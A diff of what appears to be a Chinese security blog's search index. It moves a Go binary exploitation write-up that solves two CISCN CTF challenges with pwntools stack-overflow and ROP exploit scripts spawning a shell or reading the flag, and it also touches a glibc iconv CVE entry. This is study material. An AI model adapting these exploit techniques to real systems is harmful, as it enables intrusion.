@@ -3,7 +3,7 @@
   <entry>
     <title>CVE-2024-2961</title>
     <url>/blog/2024/09/21/CVE-2024-2961/</url>
-    <content><![CDATA[<h2 id="iconv-cve-2024-2961"><a href="#iconv-cve-2024-2961" class="headerlink" title="iconv-cve-2024-2961"></a>iconv-cve-2024-2961</h2><h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
+    <content><![CDATA[<h4 id="一、利用目的"><a href="#一、利用目的" class="headerlink" title="一、利用目的"></a>一、利用目的</h4><p>在二进制程序调用iconv这个glibc函数时，或是在PHP从一个字符集转换到另一个字符集调用iconv这个API时，其中当编码转换为ISO-2022-CN-EXT时，iconv有可能会产生缓冲区溢出</p>
 <h4 id="二、利用方式"><a href="#二、利用方式" class="headerlink" title="二、利用方式"></a>二、利用方式</h4><p>以从UTF-8转义到ISO-2022-CN-EXT为例。要触发此漏洞，我们需要迫使iconv()在输出缓冲区结束前发出一个转义序列。为此，我们可以使用诸如“劄”、“䂚”、“峛“等特殊字符。这将导致1到3字节的溢出，其溢出内容如下：</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">字符 |		溢出内容		|		原UTF-8表示</span><br><span class="line">劄  		$*H [24 2A 48]      	  \xe5\x8a\x84</span><br><span class="line">䂚  		$+J [24 2B 4A]			  \xe4\x82\x9a</span><br><span class="line">峛  		$*H [24 2A 48]			  \xe5\xb3\x9b</span><br></pre></td></tr></table></figure></div>
 
@@ -314,9 +314,221 @@
       </tags>
   </entry>
   <entry>
+    <title>gopwn初探</title>
+    <url>/blog/2024/09/22/go-pwn/</url>
+    <content><![CDATA[<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
+<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
+<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
+<li>Go 语言依赖垃圾回收器管理内存，而 C&#x2F;C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
+<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C&#x2F;C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
+<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>&#x2F;<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C&#x2F;C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C&#x2F;C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
+</ul>
+<h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>
+
+<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
+                      class=""
+                >
+
+<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
+<h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
+<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
+                      class=""
+                >
+
+<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
+<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+
+<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
+                      class=""
+                >
+
+<p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
+                      class=""
+                >
+
+<p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
+                      class=""
+                >
+
+<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
+<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
+                      class=""
+                >
+
+<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
+                      class=""
+                >
+
+<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
+                      class=""
+                >
+
+<p>然后发现直接崩掉了，因为rax是一个下标，所以推断是rbx被更改了以至于赋值失败，那么rbx是在哪里被赋值的呢。实际前面有一句<code>mov rbx, [rsp+298h+var_20]</code>,也就是这个rbx基址是存在<strong>ret_addr-0x20</strong>处的。那我们不能更改这个位置的值，但我们又无法获知这个位置的值，该怎么办呢？很巧的是，程序刚好碰到+会跳过赋值，所以我们可以用8个+来保存rbx。其实也不必那么麻烦，直接全用+填充，最后再覆盖也行。然后就能成功覆盖返回地址，但这里这个填充字符数有点迷，最后我本地动调后填充了0x229个字节后才覆盖到返回地址。</p>
+<p>之后是正常的ROP，因为有syscall，就先把&#x2F;bin&#x2F;sh读取到一个地方，然后再用execve调用打即可。最后复现时本地能够用execve通，但远程却有问题，只能拿orw打，不知道是为什么。</p>
+<h6 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 你的 Base64 编码字符串</span></span><br><span class="line">encoded_str = <span class="string">&quot;JLIX8pbSvYZu/WaG&quot;</span></span><br><span class="line"><span class="comment"># 进行 Base64 解码</span></span><br><span class="line">decoded_bytes = base64.b64decode(encoded_str)</span><br><span class="line"><span class="comment"># 打印解码后的字节字符串</span></span><br><span class="line"><span class="built_in">print</span>(decoded_bytes)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./service&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node4.anna.nssctf.cn&quot;,28629)</span></span><br><span class="line">passwd = <span class="string">b&quot;S33UAga1n@#!&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;cert nAcDsMicN &quot;</span> + passwd</span><br><span class="line">p.sendlineafter(<span class="string">&quot;shell$&quot;</span>,payload)</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line">ret = <span class="number">0x000000000040103d</span></span><br><span class="line">main = <span class="number">0x00000000004C1D60</span></span><br><span class="line">data = <span class="number">0x5A34A0</span></span><br><span class="line">payload = (<span class="string">b&quot;echo &quot;</span>.ljust(<span class="number">0x1f0</span>,<span class="string">b&quot;A&quot;</span>) + <span class="string">b&quot; &quot;</span>).ljust(<span class="number">0x229</span>,<span class="string">b&quot;+&quot;</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall) </span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">1</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(data) + p64(pop_rdx_ret) + p64(<span class="number">0x40</span>) + p64(syscall)</span><br><span class="line"><span class="comment">#+ p64(pop_rax_ret) + p64(0x3b) + p64(pop_rdi_ret) + p64(data) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(syscall) + p64(main)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;nightingale#&quot;</span>,payload)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;/flag\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h5 id="CISCN-2024-初赛-gostack"><a href="#CISCN-2024-初赛-gostack" class="headerlink" title="[CISCN 2024 初赛]gostack"></a>[CISCN 2024 初赛]gostack</h5><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202922399.png"
+                      class=""
+                >
+
+<p>先运行一遍找提示字符串，看到调用位置在main_func3，直接gdb打断点进去调试一下。发现输入存在如下位置，但是存在栈上的是指针，没什么用。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202932191.png"
+                      class=""
+                >
+
+<p>之后还会把数据写到栈的另一个地方，这里直接把内容复制到栈上了，并且没有检测加跳转，可能会有溢出。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202943137.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922202953894.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203005886.png"
+                      class=""
+                >
+
+<p>然后我们再看看程序的其他部分，其中有个<strong>main_executeCommand</strong>函数引入注目，其中有如下两个子函数：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">call    os_exec_Command</span><br><span class="line">...</span><br><span class="line">call    os_exec__ptr_Cmd_Run</span><br></pre></td></tr></table></figure></div>
+
+<p>其中前者用于创建一个 <code>Cmd</code> 对象，后者用于执行真正的命令。</p>
+<p>那么我们试试直接填充0x1d0字节，然后把返回地址覆盖为<strong>main_executeCommand</strong>地址。结果会在最后<code>fmt_Fprintf-&gt;fmt__ptr_pp_doPrintf-&gt;fmt__ptr_pp_printArg-&gt;fmt__ptr_pp_fmtString-&gt;fmt__ptr_fmt_fmtS-&gt;fmt__ptr_fmt_padString-&gt;runtime_growslice</code>这个调用链然后gopanic退出，其提示信息为<code>&quot;growslice: cap out of rangeinternal loc&quot;...</code>，也就是说Go 语言在处理切片（slice）扩容时，发生容量超出合理范围时的一个运行时错误。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x449852    mov    rdi, rsi                        RDI =&gt; 0x4141414141414155 (&#x27;UAAAAAAA&#x27;)</span><br><span class="line">......</span><br><span class="line">0x449939    movabs r8, 0x1000000000000         R8 =&gt; 0x1000000000000</span><br><span class="line">0x449943    cmp    rsi, r8                     0x4141414141414155 - 0x1000000000000     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ]</span><br><span class="line">0x449946    seta   r9b</span><br><span class="line">0x44994a    mov    rsi, rcx                    RSI =&gt; 0x14</span><br><span class="line">0x44994d    mov    r10, rdx                    R10 =&gt; 0x4141414141416000</span><br><span class="line">0x449950    jmp    0x449c69                    &lt;0x449c69&gt;</span><br><span class="line">↓</span><br><span class="line">0x449c69    test   r9b, r9b     1 &amp; 1     EFLAGS =&gt; 0x202 [ cf pf af zf sf IF df of ]</span><br><span class="line">0x449c6c  ✔ jne    0x449d4d                    &lt;0x449d4d&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>我们稍微往前看就可以发现这里rsi和r8的比较实际上应该就是判断切片大小，而存大小的位置被我们覆盖成为了一堆A。也就是说我们破坏了<code>fmt_Fprintf</code>的一些参数。那我们就打断点在这个函数处看看哪些参数被覆盖成了一堆A。rdx很可疑。但前面调用<code>runtime_convTstring</code>后就没有动过rdx了，这个<code>runtime_convTstring</code>函数也比较短，可以跟进去看看。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203024108.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203039143.png"
+                      class=""
+                >
+
+<p>其中唯一修改了rdx的是这一句，这个函数的栈帧在一开始 <code>sub rsp, 20h</code> 扩充的空间，这里是把rsp+0x30处的内容复制过来，而rsp+0x30处内容前面有 <code>mov qword ptr [rsp + 0x30], rbx </code> 的修改，而我们进这个函数前rbx就已经是0x4141414141414141了，还要往前追溯。发现前面刚好有个 <code>mov rbx, [rsp+208h+var_C8]</code> ，也就是说我们不能把这个位置的数值覆盖掉。经过进一步用正常数值调试发现，这个位置存的其实就是我们输入的大小。那么我们可以试试先填充0x108个垃圾字符，然后输入大小，之后再正常填充。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203058314.png"
+                      class=""
+                >
+
+<p>前面的判断绕过了，但在fmt函数中还是崩，但这次是rcx的问题。往前找找，发现是这个<code>runtime_memmove</code>函数的第二个参数源地址被覆盖掉了。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203113527.png"
+                      class=""
+                >
+
+<p>我们直接把前面要填充的垃圾字符都换成一个可写的地址试试，成功绕过了这个死亡之call，也算是成功地绕过了所有阻碍，终于能劫持控制流返回了（这写了个0x4a0120覆盖返回地址进行测试）。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203128877.png"
+                      class=""
+                >
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203145314.png"
+                      class=""
+                >
+
+<p>后面就可以直接ret2syscall了，这里我本来还想靠<strong>os_exec_Command</strong>玩一下，但还是要先靠read把&#x2F;bin&#x2F;sh读到一个地方，不如直接调用execve。需要注意的是这个syscall会后面带着改栈上的内容，如下图这样rop链就会被打断，需要绕一下。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/blog/2024/09/22/go-pwn/image-20240922203202348.png"
+                      class=""
+                >
+
+<h6 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h6><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./gostack&quot;</span>)</span><br><span class="line">bss_add = <span class="number">0x00000000005633C0</span></span><br><span class="line">syscall = <span class="number">0x0000000000404043</span></span><br><span class="line">pop_rdi_5reg_ret = <span class="number">0x00000000004a18a5</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000042138a</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x00000000004944ec</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040f984</span></span><br><span class="line">rop = p64(pop_rdi_5reg_ret) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(pop_rsi_ret) + p64(bss_add) + p64(pop_rdx_ret) + p64(<span class="number">0x8</span>) + p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">rop += (p64(pop_rdi_5reg_ret) + p64(bss_add)*<span class="number">6</span>)*<span class="number">3</span> + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(syscall)</span><br><span class="line"></span><br><span class="line">payload = (p64(bss_add)*<span class="number">33</span> + p64(<span class="number">0x1d8</span>))+(p64(bss_add)*<span class="number">24</span>) + rop</span><br><span class="line">log.success(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your magic message :&quot;</span>,payload)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>go</tag>
+        <tag>ciscn wp</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>house_of_apple2利用手法浅析</title>
     <url>/blog/2024/11/10/house-of-apple2%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95%E6%B5%85%E6%9E%90/</url>
-    <content><![CDATA[<h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><ul>
+    <content><![CDATA[<h4 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h4><ul>
 <li>2.23——至今</li>
 </ul>
 <h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
@@ -603,221 +815,9 @@
       </tags>
   </entry>
   <entry>
-    <title>gopwn初探</title>
-    <url>/blog/2024/09/22/go-pwn/</url>
-    <content><![CDATA[<h4 id="go-pwn的特点"><a href="#go-pwn的特点" class="headerlink" title="go pwn的特点"></a>go pwn的特点</h4><ul>
-<li><strong>Golang</strong> 使用了自己的运行时和内存管理机制。Go 的堆栈是可扩展的（split-stack model），即每个 Goroutine 的堆栈大小可以动态扩展。这使得堆栈布局更加复杂，和固定大小的堆栈相比更难预测。</li>
-<li>无标准栈帧，也就是不怎么依靠rbp作为栈帧指针（但实际那个位置有时还是维护rbp），通常通过rsp进行局部变量寻址。</li>
-<li>Go 语言依赖垃圾回收器管理内存，而 C&#x2F;C++ 依赖程序员手动管理内存。这意味着在 Go 程序中，利用内存分配漏洞（如 UAF 或 double free）时，必须考虑到垃圾回收器的行为。</li>
-<li>Go 语言的异常处理机制是通过 <code>panic</code> 和 <code>recover</code> 完成的，而不像 C&#x2F;C++ 使用 <code>setjmp/longjmp</code> 或 C++ 的异常捕获机制。这导致堆栈结构和控制流的变化更为复杂，特别是在发生 <code>panic</code> 后。在漏洞利用过程中，如果程序进入了 <code>panic</code> 状态，控制流会被重定向，这可能干扰漏洞利用过程。</li>
-<li>Go 的堆内存管理机制不同于标准的 <code>malloc</code>&#x2F;<code>free</code>。Go 运行时会使用自己的内存分配器，而不是像传统 C&#x2F;C++ 程序中依赖系统的 <code>malloc</code> 和 <code>free</code>。这意味着许多针对 C&#x2F;C++ 堆的利用技术，如 <code>fastbin attack</code>、<code>tcache</code> 等，不适用于 Go 程序。</li>
-</ul>
-<h4 id="栈扩展机制"><a href="#栈扩展机制" class="headerlink" title="栈扩展机制"></a>栈扩展机制</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:</span><br><span class="line">lea     r12, [rsp+var_218]			</span><br><span class="line">cmp     r12, [r14+10h]				//上面两句也有可能是cmp rsp, [r14+10h]这种形式</span><br><span class="line">jbe     loc_4C18C0</span><br><span class="line">......</span><br><span class="line">loc_4C18C0:</span><br><span class="line">mov     [rsp+arg_0], rax</span><br><span class="line">mov     [rsp+arg_8], rbx</span><br><span class="line">mov     [rsp+arg_10], rcx</span><br><span class="line">call    runtime_morestack_noctxt</span><br><span class="line">mov     rax, [rsp+arg_0]</span><br><span class="line">mov     rbx, [rsp+arg_8]</span><br><span class="line">mov     rcx, [rsp+arg_10]</span><br><span class="line">jmp     a</span><br></pre></td></tr></table></figure></div>
-
-<p>r14+0x10地址处存的就是当前栈段的上限信息，不够时会调用runtime_morestack_noctxt进行扩展。call一个函数时与c同样会把返回地址存到栈上，在栈扩展中也会维护好这个返回地址的位置。而每次栈扩展出的新栈与原来的栈是不连续的，但一个栈段只要大小没有耗尽，也可以存多个函数的栈帧。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202642330.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202650340.png"
-                      class=""
-                >
-
-<p>可以看到这里的栈实际不在x86_64常使用的栈段中。而且确实会把返回地址压入栈。</p>
-<h4 id="传参顺序"><a href="#传参顺序" class="headerlink" title="传参顺序"></a>传参顺序</h4><p>传参用到的寄存器依次是：AX，BX，CX，DI，SI，R8，R9，R10，R11</p>
-<h4 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h4><h5 id="CISCN-2023-初赛-shallwego"><a href="#CISCN-2023-初赛-shallwego" class="headerlink" title="[CISCN 2023 初赛]shallwego"></a>[CISCN 2023 初赛]shallwego</h5><p>先运行一下看看：</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202702201.png"
-                      class=""
-                >
-
-<p>发现提供了一个shell窗口，但好像要先对cert进行一些操作。看IDA反汇编结果，其中在<strong>main_unk_func0b05</strong>有很多可疑的字符串，经整理大概有如下那么多：</p>
-<div class="highlight-container" data-rel="Txt"><figure class="iseeu highlight txt"><table><tr><td class="code"><pre><span class="line">nAcDsMicN</span><br><span class="line"></span><br><span class="line">echo</span><br><span class="line">exit</span><br><span class="line">cert</span><br><span class="line">cd</span><br><span class="line">cat flag</span><br><span class="line">ls -al</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
-
-<p>其中很多都是命令，有一个字符串是在cert命令后检测的。我们通过动态调试能够发现，r8实际存的是命令（不包括操作符）的长度，rbx存的是输入的整个命令被空格分隔的段数。那我们就可以先执行个 <code>cert nAcDsMicN abcdefg</code> 动调看看。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202742958.png"
-                      class=""
-                >
-
-<p>之后会进入 <strong>main_unk_func0b01</strong> 中，这里实际对我们输入的第三段（其实这里我们已经可以看作大概是<code>cert 用户名 密码</code>这样一个认证过程）进行加密，与一个写死的字符串进行比较，而且rc4加密的密钥也直接写在程序中了。那么我们就可以先将密文base64解码后，把得到的内容当作密码输入进去，然后看rc4加密后的结果，这个结果就是正确的密码了，因为rc4是对称加密算法。最终得到的密码值为<strong>S33UAga1n@#!</strong></p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202759540.png"
-                      class=""
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202808837.png"
-                      class=""
-                >
-
-<p>然后shell提示符就会变成 <code>nightingale#</code> ，之后也可以正常调用其他的设置好的命令，但给的那几个命令都不能直接获取真实flag的值，需要再次寻找漏洞点。经过分析发现别的命令都没什么问题，唯独echo这个命令有两段函数专门处理。并且能打印出我们输入的内容，可以尝试进行栈溢出。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202821181.png"
-                      class=""
-                >
-
-<p>看到这兴奋起来了，因为这里往栈上写了0x75，也就是u，看来是要开始将输入内容存到栈上了。我们的返回地址在<strong>0xc00011adc8</strong>，而输入从<strong>0xc00011ab98</strong>开始存，其中间隔了0x230个字节。然后这个循环中实际有<code>cmp dl, &#39;+&#39;</code>这个条件判断，如果满足会直接调回去自增rax，也就是循环中的下标自增，直接跳过了后面往栈上写的部分。</p>
-<p>那我们先试试echo 0x230字节的垃圾字符看看。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202832431.png"
-                      class=""
-                >
-
-<p>发现这里最后rdx大于0x200，就直接略过了将值赋值到栈上的操作。说明单次输入不能超过0x200字节，那如果我们在输入中间加入空格呢？</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202844042.png"
-                      class=""
-                >
-
-<p>这次成功跳过了大小的检测，再往下执行看看效果。</p>
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/blog/2024/09/22/go-pwn/image-20240922202852228.png"
-                      class=""
-                >
-
